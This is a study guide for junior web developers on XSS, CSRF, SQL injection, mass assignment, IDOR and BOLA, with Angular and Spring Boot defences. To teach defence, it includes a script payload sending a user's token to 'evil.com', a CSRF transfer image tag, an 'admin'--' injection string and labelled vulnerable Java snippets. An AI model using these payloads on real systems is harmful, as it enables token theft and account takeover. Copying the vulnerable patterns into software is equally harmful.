# Security vulnerabilities

Docs: [OWASP Top 10](https://owasp.org/www-project-top-ten/) · [MDN — XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting) · [MDN — CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF)

---

The attacks that come up most in junior interviews for web developers. You don't need to exploit them — you need to know what they are, how they work, and how your framework protects against them.

---

## XSS — Cross-Site Scripting

The attacker injects malicious JavaScript into a page that other users then load.

```
User submits a comment:
<script>fetch('https://evil.com?token=' + localStorage.getItem('token'))</script>

If the app renders this as HTML, every user who loads the page
sends their token to the attacker.
```

**How Angular protects you:** Angular escapes all dynamic values by default — `{{ userInput }}` renders as text, not HTML. The injected `<script>` tag appears as literal text on screen, never executes. You have to deliberately bypass this with `[innerHTML]` or `DomSanitizer.bypassSecurityTrustHtml()`.

**Never use `[innerHTML]` with user-provided content.**

---

## CSRF — Cross-Site Request Forgery

The attacker tricks a logged-in user's browser into making a request to your API without the user knowing. Works because cookies are sent automatically.

```
User is logged in to bank.com (session cookie stored in browser)
User visits evil.com
evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
The browser sends the request — with the bank.com cookie attached automatically
```

**Why JWT in localStorage is safe from CSRF:** localStorage is never sent automatically. The attacker's page cannot make the request carry the JWT because JavaScript on `evil.com` cannot read `localStorage` from `bank.com` (Same-Origin Policy).

**How Spring Security protects you:** CSRF protection is enabled by default in Spring Security for session-based apps. In TimeTrack, CSRF is disabled because JWT in a header is already CSRF-safe — the header must be set explicitly by JavaScript, which the attacker cannot do cross-origin.

```java
http.csrf(csrf -> csrf.disable()); // safe because we use JWT, not cookies
```

---

## SQL Injection

The attacker injects SQL code into an input that gets used in a database query.

```
Login form — username: admin'--
The query becomes:
SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
The -- comments out the password check — attacker logs in as admin
```

**How Spring Data JPA protects you:** JPA and JPQL use parameterised queries automatically. The values are never concatenated into the SQL string — they are passed as parameters, so SQL special characters are treated as data, not code.

```java
// Safe — Spring Data JPA generates parameterised SQL:
userRepository.findByEmail(email);
// → SELECT * FROM users WHERE email = ?  (email passed as parameter)
```

**Never build SQL strings by concatenating user input.** If you ever write native queries with `@Query(nativeQuery = true)`, always use `:param` placeholders, never string concatenation.

---

## Mass assignment — why you never bind the request body to the entity

If a controller binds the incoming JSON straight to the `@Entity`, a malicious client can set fields it should never control, just by adding them to the body:

```json
// the client sends this to POST /api/users
{ "email": "me@x.com", "password": "...", "role": "MANAGER", "active": true }
```

If you bind that JSON directly to the `User` entity, the attacker just made themselves a manager. This is **mass assignment**.

The fix is the **request DTO**: it declares *only* the fields a client is allowed to send. There is no `role` or `active` field on `CreateUserRequest`, so even if the attacker adds them to the JSON, Jackson has nowhere to put them and they are ignored:

```java
public class CreateUserRequest {
    @NotBlank private String email;
    @NotBlank private String password;
    // no role, no active — the client cannot set these
}
```

> Interview answer to "what could go wrong if you bind the entity directly?": mass assignment — the client could set privileged fields like `role` or `active`.

---

## Broken access control (IDOR) — never trust a client-sent user ID

The attacker changes an ID the client controls to access or modify someone else's data.

```
Employee A is logged in. The API naively trusts a userId sent in the body:
POST /api/entries  { "userId": 7, "projectId": 3, "hours": 8, ... }

Employee A changes 7 (their own id) to 12 (employee B's id) and sends it again.
If the server just saves whatever userId it receives, Employee A just created
a time entry — or read/edited existing data — that belongs to Employee B.
```

This is called **IDOR** (Insecure Direct Object Reference) and falls under OWASP's **Broken Access Control** category — consistently the #1 risk on the OWASP Top 10 in recent years.

**The fix:** never take the "who owns this" identity from the request body, query params, or path — always take it from the already-authenticated `SecurityContextHolder` (see [spring-boot/06-security-jwt.md — SecurityContextHolder](../../../spring-boot/junior/en/06-security-jwt.md#securitycontextholder--reading-the-current-user-inside-a-service)). The JWT was already verified by `JwtFilter` before the request reached the controller, so the email inside it cannot be forged without the signing secret. A `userId` field in JSON has no such guarantee — it is just text the client typed.

```java
// Vulnerable — trusts whatever the client sends
Long userId = request.getUserId();

// Safe — identity comes from the verified token, not from client input
String email = SecurityContextHolder.getContext().getAuthentication().getName();
User currentUser = userRepository.findByEmail(email).orElseThrow(...);
```

> Interview answer to "what is IDOR / broken access control?": the server trusts an identifier supplied by the client (a userId, an order id in a URL) instead of deriving ownership from the authenticated session — letting one user access or modify another user's resources just by changing that value.

---

## Broken access control (BOLA) — a filter enforced on the list endpoint, forgotten on the detail one

IDOR above is about *trusting a client-supplied id* for ownership. This is a related but different mistake in the same OWASP category (**Broken Access Control**, still the #1 risk on the OWASP Top 10): a visibility rule is correctly applied to a **collection** endpoint, and someone assumes that is enough — but the **single-item** endpoint never re-checks it, so anyone who already knows (or guesses) an id can read it directly, bypassing the rule the list endpoint enforces.

```
GET /api/projects              (list) → correctly filters: an EMPLOYEE only sees active projects
GET /api/projects/{id}         (detail) → forgets the filter entirely: returns ANY project, active or not,
                                            to ANY authenticated user
```

The reasoning that leads here is always the same trap: *"if an inactive project never shows up in the list, nobody will ever ask for it by id."* But an attacker (or just a curious employee) does not need to see it in the list — they only need to try consecutive ids in the URL (`/api/projects/1`, `/2`, `/3`...) until one returns data. This is called **BOLA** (Broken Object-Level Authorization) — the general name for "the API doesn't verify that *this specific object* is one the caller is allowed to see", of which IDOR is one common flavor.

**The fix:** re-apply the exact same visibility rule inside the detail method, not just the list one.

```java
// Vulnerable — getAll() filters by role and active status, getById() doesn't
public ProjectResponse getById(Long id) {
    return projectRepository.findById(id).map(this::toResponse)
            .orElseThrow(() -> new ResourceNotFoundException("Project not found with id: " + id));
}

// Safe — the same rule getAll() already applies, re-checked here
public ProjectResponse getById(Long id) {
    Project project = projectRepository.findById(id)
            .orElseThrow(() -> new ResourceNotFoundException("Project not found with id: " + id));

    boolean isManager = /* same role check getAll() already does */;
    if (!isManager && !project.getActive()) {
        throw new ResourceNotFoundException("Project not found with id: " + id);
    }
    return toResponse(project);
}
```

> **Why the failure is `404`, not `403`.** A `403 Forbidden` would tell the caller "this id exists, but you may not see it" — which is itself a leak: it confirms the resource is real. Throwing the *same* `ResourceNotFoundException` (`404`) for "doesn't exist" and "exists but you can't see it" makes the two cases indistinguishable from outside, exactly the way `handleBadCredentials` and `handleDisabled` return the identical generic message in [spring-boot/05-exception-handling.md](../../../spring-boot/junior/en/05-exception-handling.md) so a login attempt can't be used to enumerate which accounts exist.

> Interview answer to "what is BOLA?": an endpoint checks *who* is calling (authentication) but not whether that caller is allowed to see *this particular object* (object-level authorization) — most often because a filter was written once, on the list endpoint, and never re-applied to the detail endpoint that returns the same kind of data by id.

---

## Always validate on the server — the client is never the boundary

Client-side validation (Angular `Validators`, disabled buttons) is for **user experience** — instant feedback, no wasted round-trips. It is **not** security. Anyone can bypass the Angular app entirely and call your API directly with Postman, `curl`, or the browser DevTools, sending whatever they like.

The server is the only boundary you control, so every rule must be enforced there too — `@NotBlank` / `@Valid` on the DTO, plus the business rules in the service. The Angular validation and the Spring Boot validation are not duplication: one is UX, the other is the real defence.

---

## Summary

| Attack | How it works | Main protection |
|--------|-------------|-----------------|
| XSS | Inject script into page | Angular escapes output by default |
| CSRF | Trick browser into sending cookies | JWT in header is CSRF-safe; Spring Security CSRF for sessions |
| SQL Injection | Inject SQL into a query | JPA uses parameterised queries automatically |
| Broken access control (IDOR) | Trust a client-sent id to decide ownership | Derive identity from `SecurityContextHolder`, never from request data |
| Broken access control (BOLA) | A visibility filter exists on the list endpoint but not the detail one | Re-apply the same role/active check inside every single-item method too |

The common pattern: all five attacks involve **injecting or trusting untrusted data**, or skipping a check somewhere it should have been repeated, in a context that should be verified — HTML, HTTP requests, SQL, resource ownership, or object-level visibility. The defences all involve treating client input as data, never as code or as a source of truth for identity, and re-checking authorization at every boundary, not just the first one you thought of.
